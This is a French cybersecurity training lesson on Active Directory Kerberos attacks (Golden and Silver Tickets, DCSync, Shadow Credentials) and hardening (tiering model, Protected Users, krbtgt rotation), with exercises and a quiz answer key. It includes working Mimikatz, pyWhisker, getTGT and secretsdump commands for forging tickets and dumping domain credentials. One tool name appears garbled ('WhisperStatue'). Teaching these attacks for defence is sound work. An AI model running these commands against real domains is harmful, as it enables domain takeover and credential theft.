# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 213 (6h) : Sécurité Active Directory Avancée & Attaques de Domaines (Golden Ticket, Silver Ticket, DCSync, Shadow Credentials & Active Directory Hardening)

> [!NOTE]
> **Objectif du jour :** Maîtriser les attaques avancées sur le protocole d'authentification Kerberos d'Active Directory : forgeage de tickets **Golden Ticket** (compte `krbtgt`) et **Silver Ticket**, exécution d'attaques de réplication **DCSync**, exploitation des **Shadow Credentials (msDS-KeyCredentialLink)**, et implémentation des contrôles de sécurité avancés (**Tiering Model, AdminSDHolder, Active Directory Hardening**).
>
> **Compétences visées :** `SEC-06` (A) — Active Directory Advanced Exploitation | `SEC-04` (A) — Active Directory Hardening & Tiering Model

---

## 1) Module — Kerberos Advanced Attacks : Golden & Silver Tickets (2h)

### 📖 Narration/Intuition

Dans un domaine Active Directory, si un attaquant parvient à compromettre le hash NTLM du compte système spécial **`krbtgt`** (le compte qui chiffre tous les tickets de demande de tickets TGT Kerberos), il obtient les "clés du royaume".

Avec le hash `krbtgt`, l'attaquant peut forger un **Golden Ticket** : un faux ticket TGT signé cryptographiquement qui lui permet de se faire passer pour **n'importe quel utilisateur** (y compris le Domain Admin), d'accéder à n'importe quel serveur du domaine, et de maintenir cet accès même si tous les mots de passe des utilisateurs sont modifiés !

### 🔍 Anatomie Technique

**Comparaison Golden Ticket vs Silver Ticket :**

```
┌─────────────────────────────────────────────────────────────┐
│                      GOLDEN TICKET                          │
│  - Clé de chiffrement utilisée : Hash NTLM du compte krbtgt │
│  - Ticket forgé : TGT (Ticket Granting Ticket)              │
│  - Portée d'accès : ACCÈS TOTAL À TOUT LE DOMAIN AD         │
│  - Persistance : Valide tant que le hash krbtgt n'est pas   │
│    réinitialisé (Deux fois de suite !)                      │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                      SILVER TICKET                          │
│  - Clé utilisée : Hash NTLM d'un compte de service/machine  │
│  - Ticket forgé : TGS (Ticket Granting Service)             │
│  - Portée d'accès : Limité à UN SEUL service (ex: MSSQL/CIFS│
│  - Furtivité : N'interroge PAS le contrôleur de domaine (DC)│
└─────────────────────────────────────────────────────────────┘
```

**Forgeage d'un Golden Ticket avec Mimikatz :**

```cmd
:: 1. Récupérer le SID du domaine et le hash NTLM du compte krbtgt (via DCSync)
:: SID Domaine : S-1-5-21-3623811015-3361044348-30300820
:: Hash krbtgt : 2b5765a0b693b97db6ab8254452077e6

:: 2. Forger le Golden Ticket en tant que "Administrator" (Group ID 512 = Domain Admins)
mimikatz.exe "kerberos::golden /admin:Administrator /domain:bcc.cd /sid:S-1-5-21-3623811015-3361044348-30300820 /krbtgt:2b5765a0b693b97db6ab8254452077e6 /ptt"

:: 3. Vérifier le ticket injecté en mémoire
klist

:: 4. Accès immédiat au partage réseau du contrôleur de domaine (DC01)
dir \\DC01.bcc.cd\C$
```

---

## 2) Module — Shadow Credentials & Attaque DCSync (2h)

### 📖 Narration/Intuition

L'attaque **Shadow Credentials** (exploitée avec WhisperStatue/pyWhisker) permet à un attaquant disposant de la permission `GenericWrite` sur un objet ordinateur ou utilisateur d'injecter une clé publique X.509 dans l'attribut Active Directory **`msDS-KeyCredentialLink`**.

L'attaquant demande ensuite un TGT Kerberos en utilisant PKINIT (authentification par certificat) sans jamais connaître le mot de passe de l'utilisateur ni être détecté par les audits de mots de passe traditionnels !

### 🔍 Anatomie Technique

**Exploitation de Shadow Credentials avec pyWhisker :**

```bash
# 1. Injecter une clé RSA temporaire dans l'attribut msDS-KeyCredentialLink de la cible
python3 pywhisker.py -d bcc.cd -u kabilaj -p 'Pass123!' --target DC01$ --action add

# 2. Demander un ticket TGT via PKINIT avec la clé injectée (Impacket getTGT.py)
python3 getTGT.py bcc.cd/DC01$ -cert-pfx cert.pfx -dc-ip 192.168.1.10

# 3. Récupérer le hash NTLM du compte ordinateur DC01$ via la session PKINIT
export KRB5CCNAME=DC01$.ccache
python3 secretsdump.py -k -no-pass DC01$.bcc.cd -just-dc
```

---

## 3) Module — Active Directory Tiering Model & Hardening (2h)

### 📖 Narration/Intuition

Comment empêcher un attaquant qui a compromis un poste de travail (Tier 2) d'utiliser le mot de passe d'un Domain Admin qui s'est connecté sur ce poste pour élever ses privilèges et compromettre les contrôleurs de domaine (Tier 0) ?

La solution architecturale est le **Active Directory Administrative Tiering Model** de Microsoft.

### 🛠️ Atelier Pratique

**Architecture du Modèle de Tiering Active Directory (Microsoft Enterprise Access Model) :**

```
┌─────────────────────────────────────────────────────────────┐
│ TIER 0 — CONTROL PLANE (Contrôleurs de Domaine, PKI, AD CS) │
│  - Comptes : Domain Admins, Enterprise Admins              │
│  - Règle stricte : Les admins Tier 0 ne se connectent       │
│    JAMAIS sur des machines Tier 1 ou Tier 2                 │
└──────────────────────────────▲──────────────────────────────┘
                               │ (Isolation absolue — Pas de connexion descendante)
┌──────────────────────────────┴──────────────────────────────┐
│ TIER 1 — SERVER PLANE (Serveurs Membres, BDD, Web, EKS)     │
│  - Comptes : Server Admins, DB Admins                       │
│  - Connexion autorisée sur Tier 1 uniquement                │
└──────────────────────────────▲──────────────────────────────┘
                               │
┌──────────────────────────────┴──────────────────────────────┐
│ TIER 2 — WORKSTATION PLANE (Postes de travail, Laptops)    │
│  - Comptes : Workstation Admins, Helpdesk, Utilisateurs     │
└─────────────────────────────────────────────────────────────┘
```

**Configuration GPO de Blocage des Connexions Cross-Tier (`GPO_Tiering.xml`) :**

```
RÈGLES GPO OBLIGATOIRES :

1. User Rights Assignment sur les machines TIER 1 et TIER 2 :
   - Deny log on through Remote Desktop Services -> Tier 0 Admins
   - Deny log on locally -> Tier 0 Admins
   - Deny access to this computer from the network -> Tier 0 Admins

2. Protected Users Group (Windows Server 2012 R2+) :
   - Ajouter TOUS les comptes Tier 0 au groupe "Protected Users"
   - Effet : Désactive NTLM, désactive le stockage des mots de passe en clair dans LSASS,
     force Kerberos avec AES uniquement, réduit la durée de vie du TGT à 4 heures.

3. Rotation du compte KRBTGT (krbtgt reset script) :
   - Exécuter la réinitialisation du mot de passe `krbtgt` DEUX FOIS à 24h d'intervalle
     tous les 180 jours (pour invalider tous les Golden Tickets passés).
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **TGT** | Ticket Granting Ticket — Ticket d'authentification principal délivré par le KDC Kerberos |
| **KDC** | Key Distribution Center — Composant du contrôleur de domaine gérant Kerberos |
| **PKINIT** | Public Key Cryptography for Initial Authentication in Kerberos — Auth Kerberos par certificat |
| **PPL** | Protected Process Light — Protection de la mémoire LSASS contre la lecture d'outils tiers |
| **gMSA** | Group Managed Service Accounts — Comptes de service avec mot de passe de 128 chars géré par AD |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence de portée et de furtivité entre un **Golden Ticket** et un **Silver Ticket** dans une attaque Active Directory ?

**Corrigé :** Un **Golden Ticket** est créé en utilisant le hash NTLM du compte `krbtgt`. Il forge un **TGT (Ticket Granting Ticket)**, ce qui donne à l'attaquant un accès total et illimité à **l'ensemble des ressources du domaine Active Directory** (tous les serveurs, services et comptes). Cependant, le Golden Ticket doit interroger le KDC / Contrôleur de Domaine pour obtenir des tickets TGS applicatifs, ce qui génère des événements d'authentification (Event ID 4768/4769). Un **Silver Ticket** est créé en utilisant le hash NTLM du compte d'un **service spécifique** (ex: `MSSQLSvc` ou `CIFS` d'un serveur BDD). Il forge directement un **TGS (Ticket Granting Service)**. Sa portée est limitée à ce seul service spécifique, mais il est **extrêmement furtif** car il s'adresse directement au serveur cible **sans jamais interroger le Contrôleur de Domaine**, ne laissant aucune trace dans les logs du KDC.

**Exercice 2 :** Pourquoi la réinitialisation du mot de passe du compte **`krbtgt`** doit-elle obligatoirement être effectuée **DEUX FOIS** d'affilée (avec un délai entre les deux) pour révoquer tous les Golden Tickets ?

**Corrigé :** Active Directory conserve en mémoire la clé de chiffrement actuelle du compte `krbtgt` ET la **clé de chiffrement précédente** afin d'éviter d'interrompre immédiatement les connexions des utilisateurs dont les tickets TGT ont été émis juste avant la modification du mot de passe. Si le mot de passe du compte `krbtgt` n'est réinitialisé qu'une seule fois, les Golden Tickets forgés avec l'ancien hash NTLM restent valides car le contrôleur de domaine accepte toujours l'ancienne clé. En réinitialisant le mot de passe du compte `krbtgt` une **deuxième fois** (après avoir laissé le temps de réplication de 24h au domaine), l'ancienne clé historique est définitivement écrasée et tous les Golden Tickets existants deviennent instantanément invalides.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Le hash NTLM de quel compte Active Directory spécial doit être compromis pour pouvoir forger un **Golden Ticket** offrant un accès illimité à tout le domaine ?
- A) Le compte `krbtgt`
- B) Le compte `Guest`
- C) Le compte `Administrator` local
- D) Le compte `SYSTEM`

**Réponse : A**

**Q2 :** Quel est le principe fondamental du modèle de **Tiering Active Directory (Enterprise Access Model)** de Microsoft ?
- A) Séparer les comptes d'administration en 3 niveaux (Tier 0 Control Plane, Tier 1 Servers, Tier 2 Workstations) et interdire strictement aux comptes Tier 0 de se connecter sur des machines de niveau inférieur
- B) Mettre tous les utilisateurs dans le groupe Domain Admins
- C) Utiliser le même mot de passe pour tous les serveurs
- D) Désactiver Kerberos

**Réponse : A**

**Q3 :** Quel groupe de sécurité spécial de Windows Server (à partir de 2012 R2) permet de bloquer automatiquement le stockage des identifiants dans LSASS et d'imposer Kerberos AES pour ses membres ?
- A) Protected Users
- B) Domain Users
- C) Remote Desktop Users
- D) Power Users

**Réponse : A**

**Q4 :** Quelle attaque Active Directory consiste à injecter une clé publique X.509 dans l'attribut `msDS-KeyCredentialLink` d'un objet AD pour s'authentifier ensuite via PKINIT sans connaître son mot de passe ?
- A) Shadow Credentials
- B) Pass-the-Hash
- C) Golden Ticket
- D) SQL Injection

**Réponse : A**

**Q5 :** Combien de fois faut-il réinitialiser le mot de passe du compte `krbtgt` pour s'assurer de l'invalidation définitive de tous les Golden Tickets passés ?
- A) 2 fois (à 24h d'intervalle)
- B) 1 seule fois
- C) 5 fois
- D) Le mot de passe ne peut pas être modifié

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
